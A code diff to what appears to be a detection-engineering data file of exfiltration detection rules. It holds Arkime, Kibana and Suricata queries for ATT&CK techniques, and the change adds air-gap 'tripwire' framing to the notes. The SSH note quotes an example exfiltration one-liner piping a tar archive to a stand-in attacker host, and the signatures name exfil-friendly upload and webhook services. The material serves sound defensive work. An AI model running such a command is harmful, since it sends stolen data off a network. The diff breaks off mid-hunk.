@@ -9,7 +9,7 @@ const DATA = [
     rows: [
       {
         sub: "T1041 - Volume Ratio Anomaly",
-        indicator: "Outbound TLS session - extreme bytes-out / bytes-in ratio",
+        indicator: "[OFF-NET TRIPWIRE] Outbound TLS session - extreme bytes-out / bytes-in ratio",
         arkime: `ip.src == $INTERNAL
 && ip.dst == $EXTERNAL
 && port.dst == 443
@@ -27,7 +27,7 @@ typically done in Zeek (conn.log
 orig_bytes vs resp_bytes ratio)
 or in SIEM aggregation queries.]
 Use Zeek + SIEM for ratio detection.`,
-        notes: "Normal HTTPS browsing has bytes-in HEAVILY exceeding bytes-out - you download web pages, images, video; you upload tiny request headers and the occasional form submission. Typical legitimate ratio is 1:10 to 1:100 (out:in). Exfiltration over HTTPS inverts this: you're sending data to a server that's just acknowledging receipt with small responses. Detection: outbound flows with bytes_out > 100MB AND bytes_out > 50× bytes_in over the session lifetime. Tunable threshold - adjust based on your environment's normal upload patterns (cloud backup users, content creators, video uploaders all skew higher upload volumes legitimately). Pair with destination reputation: known-good destinations (Google Drive, Dropbox, OneDrive when sanctioned) are allowlist; ratios to unknown destinations are high-priority alerts. Zeek's conn.log has orig_bytes and resp_bytes fields - aggregate across flows per source IP per destination IP per hour for clean ratio detection.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Normal HTTPS browsing has bytes-in HEAVILY exceeding bytes-out - you download web pages, images, video; you upload tiny request headers and the occasional form submission. Typical legitimate ratio is 1:10 to 1:100 (out:in). Exfiltration over HTTPS inverts this: you're sending data to a server that's just acknowledging receipt with small responses. Detection: outbound flows with bytes_out > 100MB AND bytes_out > 50× bytes_in over the session lifetime. Tunable threshold - adjust based on your environment's normal upload patterns (cloud backup users, content creators, video uploaders all skew higher upload volumes legitimately). Pair with destination reputation: known-good destinations (Google Drive, Dropbox, OneDrive when sanctioned) are allowlist; ratios to unknown destinations are high-priority alerts. Zeek's conn.log has orig_bytes and resp_bytes fields - aggregate across flows per source IP per destination IP per hour for clean ratio detection.",
         apt: [
           { cls: "apt-mul", name: "Ransomware", note: "Ransomware double-extortion typically exfils through HTTPS C2 before encryption." },
           { cls: "apt-ru", name: "APT29", note: "Documented in SolarWinds and ongoing operations." },
@@ -39,7 +39,7 @@ Use Zeek + SIEM for ratio detection.`,
       },
       {
         sub: "T1041 - HTTPS POST Burst",
-        indicator: "HTTPS POST volume burst - sustained large POST requests to single destination",
+        indicator: "[OFF-NET TRIPWIRE] HTTPS POST volume burst - sustained large POST requests to single destination",
         kibana: `source.ip: $INTERNAL
 AND destination.port: 443
 AND http.request.method: "POST"
@@ -55,7 +55,7 @@ AND http.request.body.bytes > 1048576`,
     count 50, seconds 600;
   classtype:trojan-activity;
   sid:9104101; rev:1;)`,
-        notes: "Many C2 frameworks (Cobalt Strike, Sliver, Mythic, Brute Ratel) chunk exfil data into POST requests with bodies in the 1-5MB range to avoid triggering single-large-flow detections. The pattern: 50+ POST requests to the same destination within 10 minutes, each with bodies >1MB. This is rarely legitimate behavior - even file uploads to legitimate services (Google Drive, Dropbox) typically use multipart upload protocols that produce different patterns. Detection at the POST count + body size aggregate is high-confidence. Pair with destination IP reputation and TLS certificate/SNI patterns from C2 detection (TA0011) - exfil over already-classified C2 destinations is essentially confirmed exfil. For TLS-decrypted environments, the body content itself can reveal archive headers (PK for ZIP, Rar! for RAR) - high-fidelity content match.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Many C2 frameworks (Cobalt Strike, Sliver, Mythic, Brute Ratel) chunk exfil data into POST requests with bodies in the 1-5MB range to avoid triggering single-large-flow detections. The pattern: 50+ POST requests to the same destination within 10 minutes, each with bodies >1MB. This is rarely legitimate behavior - even file uploads to legitimate services (Google Drive, Dropbox) typically use multipart upload protocols that produce different patterns. Detection at the POST count + body size aggregate is high-confidence. Pair with destination IP reputation and TLS certificate/SNI patterns from C2 detection (TA0011) - exfil over already-classified C2 destinations is essentially confirmed exfil. For TLS-decrypted environments, the body content itself can reveal archive headers (PK for ZIP, Rar! for RAR) - high-fidelity content match.",
         apt: [
           { cls: "apt-mul", name: "Ransomware", note: "Standard pattern in Cobalt Strike-based ransomware operations." },
           { cls: "apt-mul", name: "Scattered Spider", note: "Documented in CISA AA23-320A operations." },
@@ -101,7 +101,7 @@ AND dns.question.name.length > 50`,
     rows: [
       {
         sub: "T1048.002 - SSH Outbound",
-        indicator: "Outbound SSH session - large bytes-out to non-allowlisted external destination",
+        indicator: "[OFF-NET TRIPWIRE] Outbound SSH session - large bytes-out to non-allowlisted external destination",
         arkime: `ip.src == $INTERNAL
 && ip.dst == $EXTERNAL
 && port.dst == 22
@@ -121,7 +121,7 @@ AND source.bytes > 52428800`,
   content:"SSH-"; depth:4;
   classtype:trojan-activity;
   sid:9104802; rev:1;)`,
-        notes: "SSH/SCP/SFTP for exfil is one of the most common adversary patterns when SSH egress is allowed (which it often is, for legitimate developer/admin use). Detection: outbound SSH (TCP/22) to destinations NOT on your sanctioned-destinations allowlist, with significant bytes_out. Build $SANCTIONED_SSH_DESTS to include: GitHub, GitLab, AWS bastions, sanctioned cloud providers - wherever your devs legitimately SSH. Anything else outbound on port 22 is highly suspicious. Adversary tooling often uses port 22 specifically because of how rarely it's restricted: Mega CLI, custom scp wrappers, rclone with SSH backend, or just 'tar cz | ssh attacker-host cat > stolen.tar.gz'. Volume threshold of 50MB+ catches realistic exfil while filtering out short admin SSH sessions. Pair with destination IP geolocation - SSH to residential IP addresses or hosting providers known for VPS abuse is high-priority. Modern best practice: SSH egress should be allowlisted to specific destinations at the firewall/proxy level, not relying on detection alone.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. SSH/SCP/SFTP for exfil is one of the most common adversary patterns when SSH egress is allowed (which it often is, for legitimate developer/admin use). Detection: outbound SSH (TCP/22) to destinations NOT on your sanctioned-destinations allowlist, with significant bytes_out. Build $SANCTIONED_SSH_DESTS to include: GitHub, GitLab, AWS bastions, sanctioned cloud providers - wherever your devs legitimately SSH. Anything else outbound on port 22 is highly suspicious. Adversary tooling often uses port 22 specifically because of how rarely it's restricted: Mega CLI, custom scp wrappers, rclone with SSH backend, or just 'tar cz | ssh attacker-host cat > stolen.tar.gz'. Volume threshold of 50MB+ catches realistic exfil while filtering out short admin SSH sessions. Pair with destination IP geolocation - SSH to residential IP addresses or hosting providers known for VPS abuse is high-priority. Modern best practice: SSH egress should be allowlisted to specific destinations at the firewall/proxy level, not relying on detection alone.",
         apt: [
           { cls: "apt-cn", name: "APT41", note: "SSH-based exfil documented in operations against tech sector and cloud-native targets." },
           { cls: "apt-kp", name: "Lazarus", note: "SSH exfil for cryptocurrency-related theft operations." },
@@ -139,7 +139,7 @@ AND source.bytes > 52428800`,
     rows: [
       {
         sub: "T1048.003 - FTP STOR Upload",
-        indicator: "Outbound FTP / FTPS data transfer - STOR commands with large file sizes",
+        indicator: "[OFF-NET TRIPWIRE] Outbound FTP / FTPS data transfer - STOR commands with large file sizes",
         kibana: `source.ip: $INTERNAL
 AND destination.port: (21 OR 990)
 AND ftp.command: "STOR"
@@ -153,7 +153,7 @@ AND ftp.bytes > 10485760`,
   content:"STOR "; depth:5; nocase;
   classtype:trojan-activity;
   sid:9104803; rev:1;)`,
-        notes: "FTP for exfil is common in two scenarios: (1) opportunistic - adversary uses whatever's available and outbound TCP/21 isn't blocked, (2) deliberate - older malware (APT class going back years) used FTP because it was reliable across firewall configs. Modern environments should block outbound FTP entirely; if you can't, this signature catches what gets through. Detection: FTP STOR commands (file upload) with significant bytes transferred. Zeek's ftp.log captures command, filename, response code, and bytes. False positives: legitimate FTP to sanctioned partners (build $SANCTIONED_FTP allowlist), automated industry-specific FTP (still common in healthcare, finance for legacy data exchange). FTPS on port 990 is encrypted but produces same signature on the control channel. Pair with destination reputation and filename patterns - uploads with archive extensions are particularly suspicious.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. FTP for exfil is common in two scenarios: (1) opportunistic - adversary uses whatever's available and outbound TCP/21 isn't blocked, (2) deliberate - older malware (APT class going back years) used FTP because it was reliable across firewall configs. Modern environments should block outbound FTP entirely; if you can't, this signature catches what gets through. Detection: FTP STOR commands (file upload) with significant bytes transferred. Zeek's ftp.log captures command, filename, response code, and bytes. False positives: legitimate FTP to sanctioned partners (build $SANCTIONED_FTP allowlist), automated industry-specific FTP (still common in healthcare, finance for legacy data exchange). FTPS on port 990 is encrypted but produces same signature on the control channel. Pair with destination reputation and filename patterns - uploads with archive extensions are particularly suspicious.",
         apt: [
           { cls: "apt-ru", name: "APT28", note: "FTP exfil documented in Fancy Bear operations across multiple campaigns." },
           { cls: "apt-cn", name: "APT10", note: "FTP-based exfil in MSS-aligned operations." },
@@ -164,7 +164,7 @@ AND ftp.bytes > 10485760`,
       },
       {
         sub: "T1048.003 - Outbound SMB",
-        indicator: "Outbound SMB - TCP/445 to external destination",
+        indicator: "[OFF-NET TRIPWIRE] Outbound SMB - TCP/445 to external destination",
         arkime: `ip.src == $INTERNAL
 && ip.dst == $EXTERNAL
 && port.dst == 445
@@ -181,7 +181,7 @@ AND destination.port: 445`,
   content:"|fe|SMB"; depth:4;
   classtype:trojan-activity;
   sid:9104804; rev:1;)`,
-        notes: "Outbound SMB to the internet is essentially always either malicious or misconfigured. Legitimate SMB traffic stays internal - even cloud storage providers (Azure Files, AWS FSx) typically front their SMB endpoints with VPN/private link, not raw internet exposure. Detection: any TCP/445 to non-internal destinations. Common scenarios: (1) NTLM hash capture by external attacker (file:// URL in phishing email triggers SMB connect to attacker server), (2) deliberate SMB-as-exfil (rare but used by some operators for data transfer to attacker SMB servers), (3) misconfigured app trying to connect to attacker-typo'd hostname. Modern best practice: BLOCK outbound SMB at the firewall - it's near-zero false positive impact and shuts down a whole class of attacks. If you can't block, this detection is essentially zero-false-positive in most environments. Pair with destination reputation: residential IPs, hosting providers, and recently-registered domains with SMB ports open are high-priority.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Outbound SMB to the internet is essentially always either malicious or misconfigured. Legitimate SMB traffic stays internal - even cloud storage providers (Azure Files, AWS FSx) typically front their SMB endpoints with VPN/private link, not raw internet exposure. Detection: any TCP/445 to non-internal destinations. Common scenarios: (1) NTLM hash capture by external attacker (file:// URL in phishing email triggers SMB connect to attacker server), (2) deliberate SMB-as-exfil (rare but used by some operators for data transfer to attacker SMB servers), (3) misconfigured app trying to connect to attacker-typo'd hostname. Modern best practice: BLOCK outbound SMB at the firewall - it's near-zero false positive impact and shuts down a whole class of attacks. If you can't block, this detection is essentially zero-false-positive in most environments. Pair with destination reputation: residential IPs, hosting providers, and recently-registered domains with SMB ports open are high-priority.",
         apt: [
           { cls: "apt-ru", name: "APT28", note: "Outbound SMB used historically for NTLM relay and credential capture." },
           { cls: "apt-mul", name: "Phishing Operators", note: "file:// URL phishing triggers outbound SMB to attacker server for hash capture." },
@@ -235,7 +235,7 @@ N/A pure Suricata`,
     rows: [
       {
         sub: "T1567.002 - Exfil-Friendly Cloud Storage",
-        indicator: "Outbound TLS to known exfil-friendly cloud storage - Mega, Anonfiles, Bunkr, etc.",
+        indicator: "[OFF-NET TRIPWIRE] Outbound TLS to known exfil-friendly cloud storage - Mega, Anonfiles, Bunkr, etc.",
         kibana: `source.ip: $INTERNAL
 AND destination.port: 443
 AND tls.client.server_name: (*mega.nz OR *mega.io OR *anonfiles* OR *bunkr* OR *gofile* OR *filebin* OR *catbox* OR *1fichier* OR *file.io)`,
@@ -251,7 +251,7 @@ AND tls.client.server_name: (*mega.nz OR *mega.io OR *anonfiles* OR *bunkr* OR *
     1fichier|file\\.io)/i";
   classtype:trojan-activity;
   sid:9156702; rev:1;)`,
-        notes: "Mega, Anonfiles (defunct as of 2023 but successors exist), Bunkr, Gofile, Filebin, Catbox, 1Fichier, file.io - these services share traits adversaries love: anonymous upload, large file size limits, no/minimal account requirements, often privacy-focused so they resist law enforcement. Mega in particular is heavily used in ransomware double-extortion (Conti, BlackCat, Scattered Spider all documented Mega exfil). Detection: outbound TLS with SNI matching this list. Treat any hit as high-priority - these services are essentially never legitimately used in business contexts. Some users might have personal accounts they shouldn't be using on corp networks; even those cases are policy violations worth investigating. Pair with volume - even small uploads to Mega from a workstation are suspicious; large uploads are essentially confirmed exfil. Modern best practice: block these destinations at the proxy/firewall entirely. Detection becomes a 'verify the block is working' activity.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-network infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Mega, Anonfiles (defunct as of 2023 but successors exist), Bunkr, Gofile, Filebin, Catbox, 1Fichier, file.io - these services share traits adversaries love: anonymous upload, large file size limits, no/minimal account requirements, often privacy-focused so they resist law enforcement. Mega in particular is heavily used in ransomware double-extortion (Conti, BlackCat, Scattered Spider all documented Mega exfil). Detection: outbound TLS with SNI matching this list. Treat any hit as high-priority - these services are essentially never legitimately used in business contexts. Some users might have personal accounts they shouldn't be using on corp networks; even those cases are policy violations worth investigating. Pair with volume - even small uploads to Mega from a workstation are suspicious; large uploads are essentially confirmed exfil. Modern best practice: block these destinations at the proxy/firewall entirely. Detection becomes a 'verify the block is working' activity.",
         apt: [
           { cls: "apt-mul", name: "Ransomware", note: "Mega heavily used in modern ransomware double-extortion." },
           { cls: "apt-mul", name: "Scattered Spider", note: "Documented in CISA AA23-320A operations." },
@@ -263,7 +263,7 @@ AND tls.client.server_name: (*mega.nz OR *mega.io OR *anonfiles* OR *bunkr* OR *
       },
       {
         sub: "T1567.002 - Mainstream Cloud Volume Anomaly",
-        indicator: "Outbound TLS to mainstream cloud storage with high upload volume",
+        indicator: "[OFF-NET TRIPWIRE] Outbound TLS to mainstream cloud storage with high upload volume",
         kibana: `source.ip: $INTERNAL
 AND destination.port: 443
 AND tls.client.server_name: (*dropbox* OR *onedrive* OR *1drv* OR *drive.google* OR *docs.google*)
@@ -277,7 +277,7 @@ joined with ssl.log SNI data.
 Suricata can flag SNI matches but
 not high-volume aggregations.]
 SNI match only via Suricata`,
-        notes: "Dropbox, OneDrive, Google Drive are legitimate services your users probably DO use. Detection isn't about the destination - it's about VOLUME and asymmetry. A legitimate Dropbox user might upload 100MB occasionally; an exfil operation pushes 1GB+ in a session. Build per-user or per-source-IP baselines if possible: outliers exceeding 95th percentile of normal upload volume are worth investigating. False positives: legitimate large uploads (videos, design assets, dataset uploads for ML, backup activities) - these should be predictable per-user. Cloud-side detection is more precise (Microsoft 365 audit logs, Google Workspace audit logs, Dropbox business audit logs) and SHOULD be your primary detection layer for these services - but network-side catches the egress side and provides correlation. Modern best practice: enforce sanctioned cloud storage via DLP/CASB; restrict personal accounts via tenant-restriction headers in proxies.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-network infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Dropbox, OneDrive, Google Drive are legitimate services your users probably DO use. Detection isn't about the destination - it's about VOLUME and asymmetry. A legitimate Dropbox user might upload 100MB occasionally; an exfil operation pushes 1GB+ in a session. Build per-user or per-source-IP baselines if possible: outliers exceeding 95th percentile of normal upload volume are worth investigating. False positives: legitimate large uploads (videos, design assets, dataset uploads for ML, backup activities) - these should be predictable per-user. Cloud-side detection is more precise (Microsoft 365 audit logs, Google Workspace audit logs, Dropbox business audit logs) and SHOULD be your primary detection layer for these services - but network-side catches the egress side and provides correlation. Modern best practice: enforce sanctioned cloud storage via DLP/CASB; restrict personal accounts via tenant-restriction headers in proxies.",
         apt: [
           { cls: "apt-mul", name: "Scattered Spider", note: "Dropbox/OneDrive used in CISA AA23-320A operations." },
           { cls: "apt-ru", name: "APT29", note: "Cloud storage in long-term espionage operations." },
@@ -296,7 +296,7 @@ SNI match only via Suricata`,
     rows: [
       {
         sub: "T1567.001 - Code Repo Exfil",
-        indicator: "Outbound TLS to GitHub/GitLab/Bitbucket - anomalous high upload volume from non-developer source",
+        indicator: "[OFF-NET TRIPWIRE] Outbound TLS to GitHub/GitLab/Bitbucket - anomalous high upload volume from non-developer source",
         kibana: `source.ip: $INTERNAL
 AND NOT source.ip: $DEVELOPER_HOSTS
 AND destination.port: 443
@@ -313,7 +313,7 @@ AND source.bytes > 52428800`,
     gitea|codeberg)/i";
   classtype:trojan-activity;
   sid:9156701; rev:1;)`,
-        notes: "Adversaries push exfil data to GitHub/GitLab as either: (1) a private repo they control, (2) a Gist, (3) a public repo with steganographic encoding. Detection: significant outbound volume (>50MB) from a workstation that ISN'T on your developer allowlist ($DEVELOPER_HOSTS). Developers legitimately push large amounts to git hosts; HR analysts and finance users do not. Particularly suspicious: TLS sessions with GitHub from an exec or finance laptop. False positives possible: developer running personal projects on work machine (policy violation worth reviewing), corporate use of GitHub Actions or CI/CD that pushes from non-dev hosts (allowlist these specific services). For high-stealth scenarios, adversaries split exfil into many small commits across many small files - volume detection misses this; pair with anomalous Git activity from non-dev sources at any volume.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-network infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Adversaries push exfil data to GitHub/GitLab as either: (1) a private repo they control, (2) a Gist, (3) a public repo with steganographic encoding. Detection: significant outbound volume (>50MB) from a workstation that ISN'T on your developer allowlist ($DEVELOPER_HOSTS). Developers legitimately push large amounts to git hosts; HR analysts and finance users do not. Particularly suspicious: TLS sessions with GitHub from an exec or finance laptop. False positives possible: developer running personal projects on work machine (policy violation worth reviewing), corporate use of GitHub Actions or CI/CD that pushes from non-dev hosts (allowlist these specific services). For high-stealth scenarios, adversaries split exfil into many small commits across many small files - volume detection misses this; pair with anomalous Git activity from non-dev sources at any volume.",
         apt: [
           { cls: "apt-kp", name: "Lazarus", note: "GitHub as exfil destination in cryptocurrency-targeted operations." },
           { cls: "apt-cn", name: "APT41", note: "Source code exfil to attacker-controlled repos in operations against tech sector." },
@@ -331,7 +331,7 @@ AND source.bytes > 52428800`,
     rows: [
       {
         sub: "T1567.003 - Paste Site Exfil",
-        indicator: "Outbound TLS to paste / temporary file sites - Pastebin, transfer.sh, ix.io, etc.",
+        indicator: "[OFF-NET TRIPWIRE] Outbound TLS to paste / temporary file sites - Pastebin, transfer.sh, ix.io, etc.",
         kibana: `source.ip: $INTERNAL
 AND destination.port: 443
 AND tls.client.server_name: (*pastebin* OR *paste.ee OR *transfer.sh OR *ix.io OR *dpaste* OR *hastebin* OR *ghostbin* OR *0bin* OR *privatebin*)`,
@@ -346,7 +346,7 @@ AND tls.client.server_name: (*pastebin* OR *paste.ee OR *transfer.sh OR *ix.io O
     ghostbin|0bin|privatebin)/i";
   classtype:trojan-activity;
   sid:9156703; rev:1;)`,
-        notes: "Paste sites and temporary file shares (transfer.sh - files auto-delete, Pastebin - text up to 512KB, ix.io - command-line-friendly) appeal to adversaries because: (1) anonymous, (2) often allow large content, (3) frequently bypass corporate DLP that focuses on cloud storage. Some are deliberate command-line-friendly (curl-based usage), making them well-suited to scripted exfil. Detection: outbound TLS to these specific destinations. Hits are high-priority - these services are rarely legitimately used in business contexts. Modern best practice: block these destinations at the proxy. False positives: developers occasionally use Pastebin or transfer.sh for legitimate sharing (tune by user role); some IRC/forum communities reference paste sites. Pair with volume - even small uploads (text-only paste of credentials, config files) are concerning. Encrypted pastes (PrivateBin) are particularly suspicious because they actively prevent inspection.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-network infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Paste sites and temporary file shares (transfer.sh - files auto-delete, Pastebin - text up to 512KB, ix.io - command-line-friendly) appeal to adversaries because: (1) anonymous, (2) often allow large content, (3) frequently bypass corporate DLP that focuses on cloud storage. Some are deliberate command-line-friendly (curl-based usage), making them well-suited to scripted exfil. Detection: outbound TLS to these specific destinations. Hits are high-priority - these services are rarely legitimately used in business contexts. Modern best practice: block these destinations at the proxy. False positives: developers occasionally use Pastebin or transfer.sh for legitimate sharing (tune by user role); some IRC/forum communities reference paste sites. Pair with volume - even small uploads (text-only paste of credentials, config files) are concerning. Encrypted pastes (PrivateBin) are particularly suspicious because they actively prevent inspection.",
         apt: [
           { cls: "apt-mul", name: "Cybercrime", note: "Paste sites used heavily across cybercrime operations for credential/data exfil." },
           { cls: "apt-mul", name: "Stealer Malware", note: "RedLine, Raccoon, Vidar all documented using paste sites." },
@@ -363,7 +363,7 @@ AND tls.client.server_name: (*pastebin* OR *paste.ee OR *transfer.sh OR *ix.io O
     rows: [
       {
         sub: "T1567.004 - Discord Webhook Exfil",
-        indicator: "Outbound TLS to Discord webhook endpoint - POST to /api/webhooks/",
+        indicator: "[OFF-NET TRIPWIRE] Outbound TLS to Discord webhook endpoint - POST to /api/webhooks/",
         arkime: `ip.src == $INTERNAL
 && port.dst == 443
 && host.http == "*discord*"
@@ -383,7 +383,7 @@ AND url.path: */api/webhooks/*`,
   tls.sni; content:"discord";
   classtype:trojan-activity;
   sid:9156704; rev:1;)`,
-        notes: "Discord webhooks have become one of the most common exfil channels for infostealer malware in 2024-2026. Why: (1) Discord is allowed in many corporate environments (gaming companies, community-focused businesses, marketing teams), (2) webhooks need no auth - just a URL - so they're trivial to use in malware, (3) Discord's TLS termination at discord.com or discordapp.com looks like normal user traffic. The /api/webhooks/{id}/{token} URI pattern is the giveaway - webhooks live at this path and POST requests carry the exfil payload. RedLine, Raccoon, Vidar, AsyncRAT, and dozens of other commodity malware families now default to Discord webhooks for exfil. Detection: any POST to discord.com/api/webhooks/. If your environment legitimately uses Discord (e.g., for community ops, dev integrations), allowlist specific webhook IDs you know about; everything else is high-priority. Same pattern applies to Slack incoming webhooks (hooks.slack.com/services/) and Telegram bot APIs (api.telegram.org/bot{token}). Pair with volume and source IP - exfil-via-webhook is increasingly seen on workstations where users have been phished into running stealer malware.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-network infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Discord webhooks have become one of the most common exfil channels for infostealer malware in 2024-2026. Why: (1) Discord is allowed in many corporate environments (gaming companies, community-focused businesses, marketing teams), (2) webhooks need no auth - just a URL - so they're trivial to use in malware, (3) Discord's TLS termination at discord.com or discordapp.com looks like normal user traffic. The /api/webhooks/{id}/{token} URI pattern is the giveaway - webhooks live at this path and POST requests carry the exfil payload. RedLine, Raccoon, Vidar, AsyncRAT, and dozens of other commodity malware families now default to Discord webhooks for exfil. Detection: any POST to discord.com/api/webhooks/. If your environment legitimately uses Discord (e.g., for community ops, dev integrations), allowlist specific webhook IDs you know about; everything else is high-priority. Same pattern applies to Slack incoming webhooks (hooks.slack.com/services/) and Telegram bot APIs (api.telegram.org/bot{token}). Pair with volume and source IP - exfil-via-webhook is increasingly seen on workstations where users have been phished into running stealer malware.",
         apt: [
           { cls: "apt-mul", name: "Stealer Malware", note: "Discord webhooks dominant exfil pattern in modern commodity malware." },
           { cls: "apt-mul", name: "RedLine", note: "Default Discord webhook exfil in many RedLine variants." },
@@ -433,11 +433,12 @@ SIEM-side detection`,
     rows: [
       {
         sub: "T1030 - Chunked Exfiltration",
-        indicator: "Many small-medium outbound flows to single destination - chunk-pattern exfil",
+        indicator: "[OFF-NET TRIPWIRE] Many small-medium outbound flows to single destination - chunk-pattern exfil",
         arkime: `ip.src == $INTERNAL
 && ip.dst == $EXTERNAL
 && port.dst == 443
-&& databytes.src in [524288..10485760]`,
+&& databytes.src > 524288
+&& databytes.src < 10485760`,
         kibana: `source.ip: $INTERNAL
 AND destination.ip: NOT $INTERNAL
 AND destination.port: 443
@@ -452,7 +453,7 @@ bytes. Suricata's per-flow model
 doesn't natively support this
 multi-flow aggregation logic.]
 SIEM-side aggregation`,
-        notes: "Adversaries aware of bulk-volume detections deliberately chunk exfil: each session stays under a threshold (1MB-10MB), but they make 100+ sessions to the same destination. Net result: hundreds of MB or GB exfiltrated, but no individual flow trips a 'large transfer' alert. Detection requires AGGREGATION: per (source, destination) tuple, count flows AND sum bytes across an hourly window. Alert when flow count exceeds 100 AND aggregate bytes exceed 500MB to a single destination - this is essentially diagnostic of chunked exfil. False positives: legitimate APIs that produce chatty traffic (cloud sync, certain SaaS apps) - build per-application baselines. Particularly relevant when destination is a known exfil-friendly service (combine with T1567 destination matching). The chunk-size sweet spot for adversaries is typically 1-5MB per chunk: small enough to avoid bulk-flow detection, large enough to exfil meaningful data without taking days. Detection threshold should match this range.",
+        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from the internal network to off-network infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Adversaries aware of bulk-volume detections deliberately chunk exfil: each session stays under a threshold (1MB-10MB), but they make 100+ sessions to the same destination. Net result: hundreds of MB or GB exfiltrated, but no individual flow trips a 'large transfer' alert. Detection requires AGGREGATION: per (source, destination) tuple, count flows AND sum bytes across an hourly window. Alert when flow count exceeds 100 AND aggregate bytes exceed 500MB to a single destination - this is essentially diagnostic of chunked exfil. False positives: legitimate APIs that produce chatty traffic (cloud sync, certain SaaS apps) - build per-application baselines. Particularly relevant when destination is a known exfil-friendly service (combine with T1567 destination matching). The chunk-size sweet spot for adversaries is typically 1-5MB per chunk: small enough to avoid bulk-flow detection, large enough to exfil meaningful data without taking days. Detection threshold should match this range.",
         apt: [
           { cls: "apt-ru", name: "APT29", note: "Chunked exfil documented in SolarWinds operations." },
           { cls: "apt-cn", name: "APT41", note: "Chunking patterns in operations against tech sector." },
@@ -471,7 +472,7 @@ SIEM-side aggregation`,
     rows: [
       {
         sub: "T1020 - Automation Timing Signature",
-        indicator: "Highly-regular periodic outbound flows - automation timing fingerprint",
+        indicator: "[OFF-NET TRIPWIRE] Highly-regular periodic outbound flows - automation timing fingerprint",
         arkime: `ip.src == $INTERNAL
 && ip.dst == $EXTERNAL
 `,
@@ -488,7 +489,7 @@ don't measure flow timing
 distributions; that's the job of
 flow-aware analytics layer.]
 Use Zeek + RITA or commercial NDR`,
-        notes: "Automated exfil produces highly-regular timing fingerprints: flow every 60 seconds with <5s standard deviation, flow every 5 minutes precisely, flow at exact :00 of each hour. Human users don't produce this regularity - they have variable behavior. Tools: RITA (Real Intelligence Threat Analytics) is the canonical open-source beacon detection tool, working from Zeek conn.log. Commercial NDR platforms (Corelight, ExtraHop, Vectra) include beacon detection by default. Pattern: 20+ flows from one source to one destination within an hour, with very low standard deviation in inter-arrival times. Often detected as part of C2 beacon detection (TA0011) but also applies to scheduled exfil - automated exfil tools often run on cron-like timers that produce this signature. False positives: legitimate scheduled tasks (Windows Update checks, NTP syncing, monitoring agents calling home) - build per-application baselines. After exclusions, the signature is high-confidence. Particularly important to detect because automation-driven exfil can persist for weeks before discovery if no detection layer monitors timing patterns.",
